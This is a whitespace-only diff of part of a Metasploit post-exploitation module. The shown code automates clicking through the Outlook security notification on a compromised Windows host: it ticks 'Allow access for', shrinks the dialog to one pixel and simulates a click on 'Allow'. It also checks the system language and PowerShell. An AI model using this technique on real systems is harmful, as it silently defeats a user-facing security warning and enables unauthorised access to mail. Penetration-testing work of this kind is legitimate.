@@ -73,17 +73,17 @@ class Metasploit3 < Msf::Post
     sleep 1
     hwnd = client.railgun.user32.FindWindowW(nil, "Microsoft Outlook")
     if hwnd != 0
-        hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "&#{acftrans}")
-        client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
-        client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
-        hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
-        client.railgun.user32.SetActiveWindow(hwndChild['return'])
-        client.railgun.user32.SetForegroundWindow(hwndChild['return'])
-        client.railgun.user32.SetCursorPos(150,150)
-        client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
-        client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
+      hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "&#{acftrans}")
+      client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
+      client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
+      hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
+      client.railgun.user32.SetActiveWindow(hwndChild['return'])
+      client.railgun.user32.SetForegroundWindow(hwndChild['return'])
+      client.railgun.user32.SetCursorPos(150,150)
+      client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
+      client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
     else
-        print_error("Error while clicking on the Outlook security notification. Window could not be found")
+      print_error("Error while clicking on the Outlook security notification. Window could not be found")
     end
   end
 
@@ -98,20 +98,20 @@ class Metasploit3 < Msf::Post
     # OS language check
     sysLang = client.sys.config.sysinfo['System Language']
     A_HASH.each do |key, val|
-        if sysLang == key
-           langNotSupported = false
-           atrans = A_HASH[sysLang]
-           acftrans = ACF_HASH[sysLang]
-        end
+      if sysLang == key
+        langNotSupported = false
+        atrans = A_HASH[sysLang]
+        acftrans = ACF_HASH[sysLang]
+      end
     end
 
     if allow and allow_access_for
-       atrans = allow
-       acftrans = allow_access_for
+      atrans = allow
+      acftrans = allow_access_for
     else
-       if langNotSupported == true
-           fail_with(Failure::Unknown, "System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
-       end
+      if langNotSupported == true
+        fail_with(Failure::Unknown, "System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
+      end
     end
 
     # Outlook installed
@@ -128,9 +128,9 @@ class Metasploit3 < Msf::Post
 
     # Powershell installed check
     if have_powershell?
-        print_good("Powershell is installed.")
+      print_good("Powershell is installed.")
     else
-        fail_with(Failure::Unknown, "Powershell is not installed")
+      fail_with(Failure::Unknown, "Powershell is not installed")
     end
 
     # Check whether target system is locked
